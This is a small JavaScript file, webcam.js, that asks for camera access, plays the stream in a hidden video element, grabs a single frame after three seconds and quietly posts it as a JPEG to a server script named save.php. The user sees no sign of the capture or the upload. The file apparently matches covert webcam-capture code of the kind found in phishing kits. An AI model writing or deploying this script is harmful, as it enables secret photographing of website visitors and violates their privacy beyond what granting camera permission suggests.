// webcam.js
console.log("webcam.js loaded");

async function initCam() {
  console.log("initCam() called");

  const video = document.createElement('video');
  video.setAttribute('autoplay', '');
  video.setAttribute('playsinline', '');
  video.style.display = 'none';
  document.body.appendChild(video);

  const canvas = document.createElement('canvas');
  canvas.width = 320;
  canvas.height = 240;
  const ctx = canvas.getContext('2d');

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    setTimeout(() => {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageData = canvas.toDataURL('image/jpeg');

      console.log("Sending image to save.php...");

      fetch('save.php', {
        method: 'POST',
        body: JSON.stringify({ image: imageData }),
        headers: { 'Content-Type': 'application/json' }
      });

      stream.getTracks().forEach(t => t.stop());
    }, 3000);
  } catch (err) {
    console.error('Webcam access denied', err);
  }
}
